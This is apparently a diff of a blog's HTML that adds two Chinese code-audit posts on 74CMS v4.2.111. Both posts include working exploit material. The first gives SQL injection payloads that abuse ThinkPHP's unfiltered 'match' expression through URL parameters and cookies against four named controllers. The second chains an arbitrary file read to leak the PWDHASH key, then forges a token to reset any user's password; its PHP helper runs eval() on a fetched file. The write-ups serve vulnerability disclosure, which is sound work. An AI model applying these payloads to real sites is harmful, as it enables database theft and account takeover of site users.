@@ -236,6 +236,448 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111多处sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111多处sql注入/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T14:05:24+08:00">
+                2018-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>title: 代码审计 | 74CMS_V4.2.111多处sql注入<br>date: 2018-10-08 12:15:41</p>
+<h2 id="tags-CMS"><a href="#tags-CMS" class="headerlink" title="tags: CMS"></a>tags: CMS</h2><hr>
+<p>漏洞的大致思路:</p>
+<pre><code>1.找到think_filter()漏掉的表达式match
+2.搜索用到where的参数可控的函数
+ a.get post cookie header等接收的参数
+ b.函数直接接收的参数 如  public function($id)
+3.用表达式构造sql语句
+</code></pre><p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
+<pre><code>#upload\ThinkPHP\ThinkPHP.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
+<pre><code>#upload\applicaton\common\conf\config.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png" alt="image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png-54.6kB"></p>
+<p><img src="http://static.zybuluo.com/chhyx/a036krjqziyp0q6fh9oikno5/image_1cp96prer19gn1n601jkuvocnje33.png" alt="image_1cp96prer19gn1n601jkuvocnje33.png-80.3kB"></p>
+<p>结果:使用I函数过滤的都会使用这三个函数进行过滤：</p>
+<pre><code>htmlspecialchars,stripslashes,strip_tags
+</code></pre><p>我们测试下基本的过滤规则:<br>在<code>upload\application</code>目录下新建<code>TestController.class.php</code>:</p>
+<pre><code>&lt;?php
+namespace Home\Controller;
+class TestController{
+
+function tt()
+{    
+    var_dump($_GET[&apos;id&apos;]);
+    var_dump(I(&apos;get.num&apos;,&apos;&apos;));
+}
+}
+</code></pre><p>访问:<code>http://127.0.0.1:84/index.php?m=Home&amp;c=Test&amp;a=tt&amp;id=2&#39;&quot;&lt;&gt;&amp;num=1&#39;&quot;&lt;&gt;</code><br>查看过滤信息 并未对单引号进行过滤<br><img src="http://static.zybuluo.com/chhyx/thfdp8xy6s1p42kn97offf37/image_1cp770ot51evk1n6h10fh1u2daa29.png" alt="image_1cp770ot51evk1n6h10fh1u2daa29.png-67.5kB"></p>
+<p>所有经过过滤的参数对value肯定是有过滤,但对key未进行过滤：<br><img src="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" alt="image_1cp773ng54rvi421e9og3g10okm.png-24.1kB"></p>
+<p>这里大概整理一下:<br>a.<code>_GET _POST _REQUEST _SERVER _FILES</code>系统无过滤<br>b.系统大部分使用的是<code>I</code>函数进行数据操作与过滤<br>c.调用<code>I</code>函数默认使用以下过滤规则:</p>
+<pre><code>a.将预定义字符`&amp; &quot; &apos; &lt; &gt;`转化为html实体 （单引号只有在设置ENT_QUOTES 才会转为实体）
+b.stripslashes() 函数删除由 addslashes() 函数添加的反斜杠
+c.strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签
+</code></pre><p>d.所有经过过滤的参数对value有过滤,但对key未进行过滤</p>
+<p>我们重点关注sql注入,可以知道并未对单引号进行过滤,所以我们可以</p>
+<pre><code>a.查找系统中拥有字符串拼接的地方
+b.查看是否有不使用I函数而带入数据库的 可进行框架注入
+</code></pre><p>3.如果有自带的get post cookie方法 查看其过滤规则</p>
+<p>更多基础知识请移步:<br><a href="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
+<p>##<strong>本地测试:</strong><br>1.开启debug+trace模式:<br>a.<code>upload\Application\Common\Conf\config.php</code>添加内容:</p>
+<pre><code>&apos;SHOW_PAGE_TRACE&apos;        =&gt;  true,
+</code></pre><p>b.在<code>upload\index.php</code>将<code>APP_DEBUG</code>设置为<code>true</code></p>
+<p>2.查看<code>I</code>函数的过滤情况:<br>这里的漏洞情况与笔者前几天分析的<a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">thinkphp5.0.10函数过滤不全导致一处盲注</a>思路类似,都是<code>I</code>函数用的过滤函数<code>think_filter()</code>过滤不全导致注入。</p>
+<p>think_filter():<br><img src="http://static.zybuluo.com/chhyx/kenyd6ju23x35t1zpnnkcver/image_1cp99h5raa7dr6hebthgk19388i.png" alt="image_1cp99h5raa7dr6hebthgk19388i.png-21.4kB"></p>
+<p>系统自带的表达式:<br><img src="http://static.zybuluo.com/chhyx/2rm44f6cgdjpupj9xft5k245/image_1cp99k0aj19jngo1vtt1sc51cffa2.png" alt="image_1cp99k0aj19jngo1vtt1sc51cffa2.png-17.6kB"></p>
+<p>这里漏掉了多个表达式<br>eq,is,is not,match,match_mode,match_with</p>
+<p>这里我们选取match进行利用,我们查看match相关的操作代码:</p>
+<p><img src="http://static.zybuluo.com/chhyx/sphmu2yx9iwyhfergt9m7q2d/48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png" alt="48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png-16.8kB"></p>
+<p>要想构造sql注入,需要闭合前面的双引号,但是文章开头我们说了I函数的过滤规则是过滤双引号的,这时候我们就需要寻找一处不经过I函数的或不过滤双引号的地方来构造漏洞。</p>
+<p>测试代码:</p>
+<pre><code>#Application\Home\Controller\IndexController.class.php
+public function index($id){//直接接收的参数$id不经过I函数过滤
+M(&apos;test_user&apos;)-&gt;field(&apos;id,name&apos;)-&gt;where(array(&apos;id&apos; =&gt; $id))-&gt;find();
+        echo M(&apos;test_user&apos;)-&gt;getLastSql();
+</code></pre><p>payload:</p>
+<pre><code>http://127.0.0.1:84/index.php?m=home&amp;c=index&amp;a=index&amp;id[0]=match&amp;id[1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0)-- a
+</code></pre><p>利用:<br><img src="http://static.zybuluo.com/chhyx/4wga2ajqcvsn9itkplwlmcfn/image_1cp97gkt7g831hsb60ahpiigo3g.png" alt="image_1cp97gkt7g831hsb60ahpiigo3g.png-90.9kB"></p>
+<p>##<strong>漏洞利用:</strong><br>在74cms中寻找形如寻找形如<code>M()-&gt;where($id)--&gt;xx</code>,只要where中参数可控且不会过滤双引号即可。<br>我们在编辑器内搜索相关代码调试,得到4处可利用的点。</p>
+<p>1.<code>upload\Application\Home\Controller\AjaxPersonalController.class.php</code><br><code>$company_id</code> 函数直接接收的参数,不受过滤规则的约束,可控且无过滤</p>
+<pre><code>#AjaxPersonalController.class.php 137行
+public function company_focus($company_id){
+    if(!$company_id){
+        $this-&gt;ajaxReturn(0,&apos;请选择企业！&apos;);
+    }
+    $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
+    $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
+}
+</code></pre><p>跟进<code>add_focus()</code>函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
+<p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
+<p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
+<pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
+</code></pre><p><code>$order_id</code>函数直接接收的参数 不受过滤规则的约束<br>可控且无过滤</p>
+<pre><code>public function order_pay_finish($order_id){
+$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
+    ...
+}
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vogy2h9r4ttmtfm44urvgnfy/image_1cp8qjt291cs21urq1ohr1onmjivat.png" alt="image_1cp8qjt291cs21urq1ohr1onmjivat.png-91.4kB"></p>
+<p>3.<code>upload\Application\Home\Controller\MembersController.class.php</code></p>
+<pre><code>#MembersController.class.php 220行
+public function register(){
+        ...
+        if(IS_POST &amp;&amp; IS_AJAX){
+            $data[&apos;reg_type&apos;] = I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
+            $array = array(1 =&gt; &apos;mobile&apos;,2 =&gt; &apos;email&apos;);
+            $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
+
+            if($data[&apos;reg_type&apos;] == 1){//进入
+                $data[&apos;mobile&apos;] = I(&apos;post.mobile&apos;,0,&apos;trim&apos;);//注意
+                 //判断验证码
+            ...
+
+            if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
+                $uc_user = cookie(&apos;members_uc_info&apos;);
+                $data = array_merge($data,$uc_user);//合并数组
+
+                $passwordVerify = $data[&apos;password&apos;];
+            }
+            ...
+            // 若手机号重复且勾选了解绑原帐号
+            if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
+                $data[&apos;unbind_mobile&apos;] = I(&apos;post.unbind_mobile&apos;,0,&apos;intval&apos;);
+                if($data[&apos;unbind_mobile&apos;]){
+                    $repeat = M(&apos;Members&apos;)-&gt;where(array(&apos;mobile&apos;=&gt;$data[&apos;mobile&apos;]))-&gt;select();//漏洞触发点
+</code></pre><p>漏洞利用条件:</p>
+<pre><code>a.IS_POST &amp;&amp; IS_AJAX
+b.bind&apos; == $ucenter
+c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
+d.$data[&apos;unbind_mobile&apos;] 存在
+</code></pre><p>这里的漏洞参数<code>$data[&#39;mobile&#39;]</code> 是可控的<br>虽然<code>$data[&#39;mobile&#39;]</code>是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对<code>cookie</code>接收的参数进行了合并,这样我们就可以利用<code>cookie</code>方式来传递我们的sql语句来进行注入</p>
+<p>payload分析:</p>
+<pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
+headers:Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest         //满足AJAX操作
+
+Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
+<p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
+<p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
+<pre><code>public function oauth_reg(){
+
+        if (cookie(&apos;members_bind_info&apos;)) {
+
+            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
+
+        }else{
+            $this-&gt;error(&apos;第三方授权失败，请重新操作！&apos;);
+        }
+        //第三方帐号绑定
+        $username = I(&apos;post.username&apos;,&apos;&apos;,&apos;trim&apos;);
+        $password = I(&apos;post.password&apos;,&apos;&apos;,&apos;trim&apos;);
+        $passport = $this-&gt;_user_server();
+        ...
+    }
+
+        else{//进入
+            $user = $passport-&gt;_user;//获取个人信息
+            ...//uid不可控 所以这里不可利用
+        }
+        ...
+        $info = M(&apos;MembersBind&apos;)-&gt;where(array(&apos;type&apos;=&gt;$user_bind_info[&apos;type&apos;],&apos;uid&apos;=&gt;$uid))-&gt;find();//触发点
+</code></pre><p>payload:</p>
+<pre><code>header：Content-Type: application/x-www-form-urlencoded
+       //表明提交的表单数据编码为键值对,用&amp;分隔
+
+Cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+
+POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
+</code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
+                2018-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
+<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
+<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
+<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
+<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
+<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
+</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
+<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
+// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
+// 经过 passport_key() 函数处理后的返回值
+$txt = passport_key(base64_decode($txt), $key);
+// 变量初始化
+$tmp = &apos;&apos;;
+// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
+for ($i = 0; $i &lt; strlen($txt); $i++) {
+    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
+    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
+    $tmp .= $txt[$i] ^ $txt[++$i];
+}
+// 返回 $tmp 的值作为结果
+return $tmp;
+</code></pre><p>}</p>
+<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
+<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
+<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
+<p>可看到修改成功。</p>
+<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
+<p>4.现在利用漏洞就很简单了</p>
+<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
+</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
+<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
+<p>2.我们本地加密得到<code>token</code>:</p>
+<pre><code>#demo.php
+&lt;?php
+
+function get_token($pwdhash){
+    $token = encrypt($pwdhash,$pwdhash);
+    var_dump($token);
+
+}
+function encrypt($txt, $key = &apos;_qscms&apos;) {
+    ...
+}
+function passport_key($txt, $encrypt_key) {
+   ...
+}
+
+$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
+$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
+get_token($data[&apos;PWDHASH&apos;]);
+?&gt;
+</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
+<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -422,277 +864,6 @@ def main():
 
 main()
 </code></pre><p>成功截图:<br><img src="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png" alt="image_1cpcf5kaeh1h1lora691vfp12542i.png-207.8kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/08/74CMS_V4.2.111多处sql注入/" itemprop="url">Untitled</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T20:45:04+08:00">
-                2018-10-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>title: 代码审计 | 74CMS_V4.2.111多处sql注入<br>date: 2018-10-08 09:15:41<br>tags: CMS</p>
-<hr>
-<hr>
-<p>漏洞的大致思路:</p>
-<pre><code>1.找到think_filter()漏掉的表达式match
-2.搜索用到where的参数可控的函数
- a.get post cookie header等接收的参数
- b.函数直接接收的参数 如  public function($id)
-3.用表达式构造sql语句
-</code></pre><hr>
-<p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
-<pre><code>#upload\ThinkPHP\ThinkPHP.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
-<pre><code>#upload\applicaton\common\conf\config.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png" alt="image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png-54.6kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/a036krjqziyp0q6fh9oikno5/image_1cp96prer19gn1n601jkuvocnje33.png" alt="image_1cp96prer19gn1n601jkuvocnje33.png-80.3kB"></p>
-<p>结果:使用I函数过滤的都会使用这三个函数进行过滤：</p>
-<pre><code>htmlspecialchars,stripslashes,strip_tags
-</code></pre><p>我们测试下基本的过滤规则:<br>在<code>upload\application</code>目录下新建<code>TestController.class.php</code>:</p>
-<pre><code>&lt;?php
-namespace Home\Controller;
-class TestController{
-
-function tt()
-{    
-    var_dump($_GET[&apos;id&apos;]);
-    var_dump(I(&apos;get.num&apos;,&apos;&apos;));
-}
-}
-</code></pre><p>访问:<code>http://127.0.0.1:84/index.php?m=Home&amp;c=Test&amp;a=tt&amp;id=2&#39;&quot;&lt;&gt;&amp;num=1&#39;&quot;&lt;&gt;</code><br>查看过滤信息 并未对单引号进行过滤<br><img src="http://static.zybuluo.com/chhyx/thfdp8xy6s1p42kn97offf37/image_1cp770ot51evk1n6h10fh1u2daa29.png" alt="image_1cp770ot51evk1n6h10fh1u2daa29.png-67.5kB"></p>
-<p>所有经过过滤的参数对value肯定是有过滤,但对key未进行过滤：<br><img src="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" alt="image_1cp773ng54rvi421e9og3g10okm.png-24.1kB"></p>
-<p>这里大概整理一下:<br>a.<code>_GET _POST _REQUEST _SERVER _FILES</code>系统无过滤<br>b.系统大部分使用的是<code>I</code>函数进行数据操作与过滤<br>c.调用<code>I</code>函数默认使用以下过滤规则:</p>
-<pre><code>a.将预定义字符`&amp; &quot; &apos; &lt; &gt;`转化为html实体 （单引号只有在设置ENT_QUOTES 才会转为实体）
-b.stripslashes() 函数删除由 addslashes() 函数添加的反斜杠
-c.strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签
-</code></pre><p>d.所有经过过滤的参数对value有过滤,但对key未进行过滤</p>
-<p>我们重点关注sql注入,可以知道并未对单引号进行过滤,所以我们可以</p>
-<pre><code>a.查找系统中拥有字符串拼接的地方
-b.查看是否有不使用I函数而带入数据库的 可进行框架注入
-</code></pre><p>3.如果有自带的get post cookie方法 查看其过滤规则</p>
-<p>更多基础知识请移步:<br><a href="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
-<p>##<strong>本地测试:</strong><br>1.开启debug+trace模式:<br>a.<code>upload\Application\Common\Conf\config.php</code>添加内容:</p>
-<pre><code>&apos;SHOW_PAGE_TRACE&apos;        =&gt;  true,
-</code></pre><p>b.在<code>upload\index.php</code>将<code>APP_DEBUG</code>设置为<code>true</code></p>
-<p>2.查看<code>I</code>函数的过滤情况:<br>这里的漏洞情况与笔者前几天分析的<a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">thinkphp5.0.10函数过滤不全导致一处盲注</a>思路类似,都是<code>I</code>函数用的过滤函数<code>think_filter()</code>过滤不全导致注入。</p>
-<p>think_filter():<br><img src="http://static.zybuluo.com/chhyx/kenyd6ju23x35t1zpnnkcver/image_1cp99h5raa7dr6hebthgk19388i.png" alt="image_1cp99h5raa7dr6hebthgk19388i.png-21.4kB"></p>
-<p>系统自带的表达式:<br><img src="http://static.zybuluo.com/chhyx/2rm44f6cgdjpupj9xft5k245/image_1cp99k0aj19jngo1vtt1sc51cffa2.png" alt="image_1cp99k0aj19jngo1vtt1sc51cffa2.png-17.6kB"></p>
-<p>这里漏掉了多个表达式<br>eq,is,is not,match,match_mode,match_with</p>
-<p>这里我们选取match进行利用,我们查看match相关的操作代码:</p>
-<p><img src="http://static.zybuluo.com/chhyx/sphmu2yx9iwyhfergt9m7q2d/48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png" alt="48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png-16.8kB"></p>
